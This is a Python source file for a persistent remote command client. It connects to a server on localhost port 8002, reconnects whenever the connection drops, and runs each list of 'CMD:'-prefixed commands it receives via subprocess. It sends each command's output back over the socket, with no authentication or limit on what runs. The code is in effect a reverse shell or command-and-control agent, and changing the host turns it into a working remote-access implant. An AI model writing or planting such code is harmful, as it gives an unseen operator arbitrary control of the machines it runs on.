import socket
import time
import threading
import subprocess
import ast


HOST = "localhost"
PORT = 8002

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Enable socket reuse

def connectToServer():
    try:
        global client_socket  # Declare the client_socket variable as global
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        client_socket.connect((HOST, PORT))
        print(f"Connection Successful -> {HOST}, {PORT}")
        handleDataTransfer(client_socket)
        print("Reconnecting")
        time.sleep(10)
        connectToServer()
    except Exception as e:
        print(f"Exception occured when connecting -> {e}")
        time.sleep(5)
        connectToServer()

def handleDataTransfer(client_socket_):
    while True:
        try:
            data = client_socket_.recv(1024)
            if not data:
                client_socket_.close()
                connectToServer()
            parse_data(data.decode(), client_socket_)
            if not data:
                connectToServer()
        except Exception as e:
            print(f"Exception occured -> {e}")
            connectToServer()




def parse_data(data, client_socket):
    if data[:4] == "CMD:":
        print(data)
        command_str = data[4:]  # Remove the "CMD:" prefix
        try:
            commands = ast.literal_eval(command_str)
            if isinstance(commands, list):
                # Process the list of commands
                for command in commands:
                    execute_command(command, client_socket)
            else:
                print("Invalid command format")
        except (ValueError, SyntaxError):
            print("Invalid command format")
    else:
        print(f"Received data: {data}")

def execute_command(command, client_socket):
    # Code to execute the command
    splited_command = command.split(' ')
    output = subprocess.run(splited_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    client_socket.send(output.stdout)
    client_socket.send(output.stderr)
    print("DataSent")
    print(output)



if __name__ == "__main__":
    # Start the initial connection attempt
    threading.Thread(target=connectToServer).start()
    print("running")
